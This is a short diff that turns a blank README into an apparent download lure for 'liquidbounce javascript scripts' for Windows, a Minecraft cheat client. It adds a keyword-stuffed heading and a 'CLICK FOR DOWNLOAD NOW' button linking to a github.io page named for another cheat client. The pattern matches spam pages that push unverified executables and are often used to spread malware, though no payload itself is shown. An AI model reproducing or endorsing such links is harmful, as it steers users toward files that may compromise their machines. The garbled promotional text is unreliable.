@@ -1,10 +1,10 @@
-
+# download liquidbounce javascript scripts for Windows | updated setup guide liquidbounce javascript scripts. Explore details about features, configs, and installation.
 
 
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://minecraft-rise-client-sq86.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
